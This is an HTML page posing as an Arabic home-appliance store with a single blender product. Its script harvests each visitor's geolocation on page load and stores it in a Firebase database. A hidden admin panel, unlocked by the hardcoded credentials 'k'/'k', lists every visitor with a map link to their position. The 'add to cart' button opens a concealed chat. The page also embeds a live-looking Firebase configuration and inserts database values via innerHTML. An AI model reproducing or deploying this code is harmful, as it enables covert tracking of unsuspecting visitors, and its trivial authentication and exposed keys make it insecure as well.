<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>متجر الأجهزة الكهربائية</title>
    <style>
        body { font-family: sans-serif; background: #f8f9fa; margin: 0; padding: 15px; }
        #shop-view { max-width: 1000px; margin: auto; }
        .product-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 20px; }
        .product { background: white; border-radius: 10px; padding: 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); text-align: center; }
        .buy-btn { background: #28a745; color: white; border: none; width: 100%; padding: 10px; border-radius: 5px; cursor: pointer; }
        
        #admin-login { margin: 20px 0; text-align: center; }
        #admin-panel { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 1002; padding: 20px; overflow-y: auto; }
        .user-card { background: #eee; margin: 10px 0; padding: 10px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; }
        
        #secret-chat { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 999; }
        #messages { height: calc(100% - 140px); overflow-y: auto; padding: 15px; display: flex; flex-direction: column; background: #e5ddd5; }
        .msg { max-width: 70%; padding: 8px 12px; margin: 5px 0; border-radius: 10px; }
        .sent { align-self: flex-end; background: #dcf8c6; }
        .received { align-self: flex-start; background: white; }
        .input-box { position: absolute; bottom: 0; width: 100%; padding: 10px; display: flex; background: #f0f0f0; box-sizing: border-box; }
        .chat-btn { border: none; padding: 10px; border-radius: 50%; cursor: pointer; margin-left: 5px; }
    </style>
</head>
<body>

<div id="shop-view">
    <div id="admin-login">
        <button onclick="showLogin()" style="background:#333; color:white; border:none; padding:5px 15px; border-radius:5px; cursor:pointer;">دخول المسؤول</button>
    </div>
    <h3 style="text-align: center;">متجر الأجهزة المنزلية</h3>
    <div class="product-grid">
        <div class="product">
            <img src="https://m.media-amazon.com/images/I/71Y8S4S4K8L._AC_SL1500_.jpg" width="100">
            <h4>خلاط توربو</h4><p>180 ر.س</p>
            <button class="buy-btn" onclick="openSecretChat('خلاط توربو', '180 ر.س')">إضافة للسلة</button>
        </div>
    </div>
</div>

<div id="admin-panel">
    <div style="display:flex; justify-content:space-between;">
        <h2>لوحة تحكم المستخدمين</h2>
        <button onclick="location.reload()" style="background:red; color:white; border:none; padding:10px;">إغلاق</button>
    </div>
    <div id="users-list"></div>
</div>

<div id="secret-chat">
    <div style="background:#2c3e50; color:white; padding:15px; text-align:center;">محادثة آمنة</div>
    <div id="messages"></div>
    <div class="input-box">
        <button id="recordBtn" class="chat-btn">🎤</button>
        <button onclick="document.getElementById('imageInput').click()" class="chat-btn">🖼️</button>
        <input type="file" id="imageInput" style="display:none" onchange="sendImage()">
        <input type="text" id="msgInput" style="flex:1; border-radius:20px; border:none; padding:10px;" placeholder="اكتب هنا...">
        <button id="sendBtn" class="chat-btn" style="background:#128c7e; color:white;">➤</button>
    </div>
</div>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
  import { getDatabase, ref, push, onChildAdded, serverTimestamp, set, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

  const firebaseConfig = {
    apiKey: "AIzaSyCTWE1rHaIgQPZyWDzC2-apkHCY5Ap6hh4",
    authDomain: "secretshop-ef903.firebaseapp.com",
    databaseURL: "https://secretshop-ef903-default-rtdb.firebaseio.com",
    projectId: "secretshop-ef903",
    storageBucket: "secretshop-ef903.appspot.com",
    messagingSenderId: "162721709550",
    appId: "1:162721709550:web:527b6947f0302c174022ff"
  };

  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);
  const usersRef = ref(db, 'users');
  const messagesRef = ref(db, 'chats');

  const myId = localStorage.getItem('my_id') || 'user_' + Math.random().toString(36).substr(2, 9);
  localStorage.setItem('my_id', myId);

  // تحديث موقع المستخدم وحفظه في Firebase
  navigator.geolocation.getCurrentPosition(pos => {
      set(ref(db, 'users/' + myId), {
          id: myId,
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          lastSeen: serverTimestamp()
      });
  });

  // تسجيل الدخول
  window.showLogin = function() {
      const user = prompt("اسم المستخدم:");
      const pass = prompt("كلمة السر:");
      if (user === "k" && pass === "k") {
          document.getElementById('admin-panel').style.display = 'block';
          loadUsers();
      } else {
          alert("خطأ في البيانات!");
      }
  };

  function loadUsers() {
      onValue(usersRef, (snapshot) => {
          const list = document.getElementById('users-list');
          list.innerHTML = "";
          snapshot.forEach(child => {
              const u = child.val();
              const div = document.createElement('div');
              div.className = 'user-card';
              div.innerHTML = `<span>مستخدم: ${u.id}</span>
                <button onclick="window.open('https://www.google.com/maps?q=${u.lat},${u.lng}')" style="background:green; color:white; border:none; padding:5px 10px; border-radius:5px;">عرض الموقع 📍</button>`;
              list.appendChild(div);
          });
      });
  }

  // ميزات الشات (نصوص، صور، صوت)
  window.openSecretChat = (p, pr) => {
      document.getElementById('shop-view').style.display = 'none';
      document.getElementById('secret-chat').style.display = 'block';
      if(p) push(messagesRef, { sender: myId, text: `طلب: ${p} - ${pr}`, type: 'text' });
  };

  document.getElementById('sendBtn').onclick = () => {
      const text = document.getElementById('msgInput').value;
      if(text) { push(messagesRef, { sender: myId, text, type: 'text' }); document.getElementById('msgInput').value = ""; }
  };

  onChildAdded(messagesRef, (data) => {
      const msg = data.val();
      const div = document.createElement('div');
      div.className = `msg ${msg.sender === myId ? 'sent' : 'received'}`;
      div.innerText = msg.text;
      document.getElementById('messages').appendChild(div);
      document.getElementById('messages').scrollTop = document.getElementById('messages').scrollHeight;
  });
</script>
</body>
</html>
